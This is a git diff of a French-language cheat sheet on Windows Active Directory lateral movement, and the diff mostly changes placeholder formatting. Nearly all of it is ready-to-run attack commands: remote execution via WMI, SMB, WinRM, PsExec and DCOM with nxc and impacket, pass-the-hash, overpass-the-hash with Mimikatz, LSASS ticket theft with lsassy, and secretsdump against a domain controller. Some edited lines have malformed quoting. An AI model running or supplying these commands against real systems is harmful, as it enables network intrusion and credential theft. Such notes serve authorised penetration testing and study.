@@ -1,4 +1,4 @@
-# Lateral Movement
+﻿# Lateral Movement
 
 ## WMI
 
@@ -8,11 +8,11 @@ Exécute des processus à distance via `Win32_Process.Create`. Nécessite d'êtr
 
 ```bash
 # nxc
-nxc smb <IP_CIBLE> -u <user> -p <password> -x "whoami"
-nxc smb <IP_CIBLE> -u <user> -p <password> -x "whoami" --exec-method wmiexec
+nxc smb 'IP_CIBLE' -u 'USER' -p 'PASSWORD' -x "whoami"
+nxc smb 'IP_CIBLE' -u 'USER' -p 'PASSWORD' -x "whoami" --exec-method wmiexec
 
 # impacket -  shell interactif
-impacket-wmiexec corp.com/<user>:<password>@<IP_CIBLE>
+impacket-wmiexec corp.com/'USER':'PASSWORD'@'IP_CIBLE'
 ```
 
 Ports utilisés par `wmiexec` :
@@ -21,7 +21,7 @@ Ports utilisés par `wmiexec` :
 
 Si seul le port **445** est disponible, utiliser `smbexec` -  crée un service temporaire via SCM, sans passer par WMI : 
 ```bash
-nxc smb <IP_CIBLE> -u <user> -p <password> -x "whoami" --exec-method smbexec
+nxc smb 'IP_CIBLE' -u 'USER' -p 'PASSWORD' -x "whoami" --exec-method smbexec
 ```
 
 **PowerShell (Windows)** : `Get-WmiObject`, `Invoke-WmiMethod`
@@ -35,13 +35,13 @@ Protocole WS-Management sur TCP **5985** (HTTP) / **5986** (HTTPS). Nécessite d
 **evil-winrm (shell interactif)**
 
 ```bash
-evil-winrm -i <IP_CIBLE> -u <user> -p <password>
+evil-winrm -i <IP_CIBLE> -u <USER> -p <PASSWORD>
 ```
 
 **nxc (exécution de commande)**
 
 ```bash
-nxc winrm <IP_CIBLE> -u <user> -p <password> -X "whoami"
+nxc winrm 'IP_CIBLE' -u 'USER' -p 'PASSWORD' -X "whoami"
 ```
 
 **PowerShell (Windows)** : `Enter-PSSession`, `Invoke-Command`, `New-PSSession`
@@ -59,14 +59,14 @@ Fonctionnement : copie un binaire service (`PSEXESVC.exe`) sur ADMIN$, le démar
 **impacket-psexec (depuis Kali)**
 
 ```bash
-impacket-psexec corp.com/<user>:<password>@<IP_CIBLE>
+impacket-psexec corp.com/'USER':'PASSWORD'@'IP_CIBLE'
 ```
 
 **nxc avec smbexec (équivalent psexec via nxc)**
 
 ```bash
 # smbexec = crée un service pour exécuter la commande, tout via SMB (port 445 uniquement)
-nxc smb <IP_CIBLE> -u <user> -p <password> -x "whoami" --exec-method smbexec
+nxc smb 'IP_CIBLE' -u 'USER' -p 'PASSWORD' -x "whoami" --exec-method smbexec
 ```
 
 > nxc tente les méthodes dans cet ordre si aucune n'est forcée : `wmiexec` → `atexec` → `smbexec`
@@ -74,7 +74,7 @@ nxc smb <IP_CIBLE> -u <user> -p <password> -x "whoami" --exec-method smbexec
 **PsExec64.exe Windows -  [Sysinternals](https://learn.microsoft.com/en-us/sysinternals/)**
 
 ```cmd
-.\PsExec64.exe -i \\<HOSTNAME> -u corp\<user> -p <password> cmd
+.\PsExec64.exe -i \\<HOSTNAME> -u corp\<USER> -p <PASSWORD> cmd
 ```
 
 ## Pass the Hash (PtH)
@@ -87,29 +87,29 @@ Authentification avec le hash NTLM directement, sans le mot de passe en clair. F
 
 ```bash
 # SMB
-nxc smb <IP> -u Administrator -H '<NTLM_HASH>'
+nxc smb 'IP' -u Administrator -H ''NTLM_HASH''
 
 # WinRM
-nxc winrm <IP> -u Administrator -H '<NTLM_HASH>'
+nxc winrm 'IP' -u Administrator -H ''NTLM_HASH''
 
 # RDP
-nxc rdp <IP> -u Administrator -H '<NTLM_HASH>'
+nxc rdp 'IP' -u Administrator -H ''NTLM_HASH''
 
 # LDAP
-nxc ldap <IP> -u Administrator -H '<NTLM_HASH>'
+nxc ldap 'IP' -u Administrator -H ''NTLM_HASH''
 ```
 
 **impacket**
 
 ```bash
 # shell via WMI
-impacket-wmiexec -hashes :'<NTLM_HASH>' <user>@<IP_CIBLE>
+impacket-wmiexec -hashes :''NTLM_HASH'' 'USER'@'IP_CIBLE'
 
 # shell via PsExec (crée un service)
-impacket-psexec -hashes :'<NTLM_HASH>' <user>@<IP_CIBLE>
+impacket-psexec -hashes :''NTLM_HASH'' 'USER'@'IP_CIBLE'
 
 # smbclient
-impacket-smbclient -hashes :'<NTLM_HASH>' <user>@<IP_CIBLE>
+impacket-smbclient -hashes :''NTLM_HASH'' 'USER'@'IP_CIBLE'
 ```
 
 **evil-winrm**
@@ -130,31 +130,31 @@ Obtenir le TGT
 
 ```bash
 # impacket
-impacket-getTGT corp.com/<user> -hashes :<NTLM_HASH> -dc-ip <IP_DC>
+impacket-getTGT corp.com/'USER' -hashes :'NTLM_HASH' -dc-ip 'IP_DC'
 
 # nxc
-nxc smb <IP_DC> -u <user> -H <NTLM_HASH> --generate-tgt /tmp/<user>.ccache
+nxc smb 'IP_DC' -u 'USER' -H 'NTLM_HASH' --generate-tgt /tmp/'USER'.ccache
 ```
 
 Utiliser le TGT
 
 ```bash
-export KRB5CCNAME=/tmp/<user>.ccache
+export KRB5CCNAME=/tmp/<USER>.ccache
 
 # impacket (-target-ip si le hostname ne résout pas sur Kali)
-impacket-psexec -k -no-pass corp.com/<user>@<HOSTNAME> -dc-ip <IP_DC> -target-ip <IP_CIBLE>
-impacket-wmiexec -k -no-pass corp.com/<user>@<HOSTNAME> -dc-ip <IP_DC> -target-ip <IP_CIBLE>
-impacket-smbclient -k -no-pass corp.com/<user>@<HOSTNAME> -dc-ip <IP_DC> -target-ip <IP_CIBLE>
-impacket-secretsdump -k -no-pass corp.com/<user>@<HOSTNAME_DC> -dc-ip <IP_DC> -target-ip <IP_DC>
+impacket-psexec -k -no-pass corp.com/'USER'@'HOSTNAME' -dc-ip 'IP_DC' -target-ip 'IP_CIBLE'
+impacket-wmiexec -k -no-pass corp.com/'USER'@'HOSTNAME' -dc-ip 'IP_DC' -target-ip 'IP_CIBLE'
+impacket-smbclient -k -no-pass corp.com/'USER'@'HOSTNAME' -dc-ip 'IP_DC' -target-ip 'IP_CIBLE'
+impacket-secretsdump -k -no-pass corp.com/'USER'@'HOSTNAME_DC' -dc-ip 'IP_DC' -target-ip 'IP_DC'
 
 # nxc
-nxc smb <IP_CIBLE> -u <user> -k --use-kcache --kdcHost <IP_DC>
+nxc smb 'IP_CIBLE' -u 'USER' -k --use-kcache --kdcHost 'IP_DC'
 ```
 
 **Windows (Mimikatz)**
 
 ```
-sekurlsa::pth /user:<user> /domain:corp.com /ntlm:<NTLM_HASH> /run:powershell
+sekurlsa::pth /user:<USER> /domain:corp.com /ntlm:<NTLM_HASH> /run:powershell
 ```
 
 Spawne un PowerShell. Déclencher un AS-REQ pour générer le TGT en mémoire :
@@ -185,7 +185,7 @@ Voler un TGT ou TGS depuis la mémoire LSASS d'une machine et l'utiliser dans un
 
 1. Extraire les tickets de LSASS à distance
 ```bash
-nxc smb <IP_CIBLE> -u <user> -H <NTLM_HASH> -M lsassy
+nxc smb 'IP_CIBLE' -u 'USER' -H 'NTLM_HASH' -M lsassy
 ```
 
 2. Choisir et charger le ticket
@@ -202,7 +202,7 @@ export KRB5CCNAME='/home/kali/.nxc/modules/lsassy/TG[...].ccache'
 
 3. Utiliser le ticket
 ```bash
-nxc smb <IP_CIBLE> -u <user> -k --use-kcache --kdcHost <IP_DC>
+nxc smb 'IP_CIBLE' -u 'USER' -k --use-kcache --kdcHost 'IP_DC'
 ```
 
 **Windows (Mimikatz)**
@@ -231,12 +231,12 @@ Objet utilisé : **MMC20.Application** → méthode `Document.ActiveView.Execute
 ```bash
 # Par défaut : ShellWindows (nécessite explorer.exe actif → échoue sur les serveurs sans session interactive)
 # Préférer MMC20 qui tourne en Session 0 (indépendant des sessions utilisateur)
-impacket-dcomexec -object MMC20 corp.com/<user>:<password>@<IP_CIBLE>
-impacket-dcomexec -object ShellWindows corp.com/<user>:<password>@<IP_CIBLE>
-impacket-dcomexec -object ShellBrowserWindow corp.com/<user>:<password>@<IP_CIBLE>
+impacket-dcomexec -object MMC20 corp.com/'USER':'PASSWORD'@'IP_CIBLE'
+impacket-dcomexec -object ShellWindows corp.com/'USER':'PASSWORD'@'IP_CIBLE'
+impacket-dcomexec -object ShellBrowserWindow corp.com/'USER':'PASSWORD'@'IP_CIBLE'
 
 # Avec hash NTLM
-impacket-dcomexec -hashes :<NTLM_HASH> corp.com/<user>@<IP_CIBLE>
+impacket-dcomexec -hashes :'NTLM_HASH' corp.com/'USER'@'IP_CIBLE'
 ```
 
 **Windows (PowerShell)**
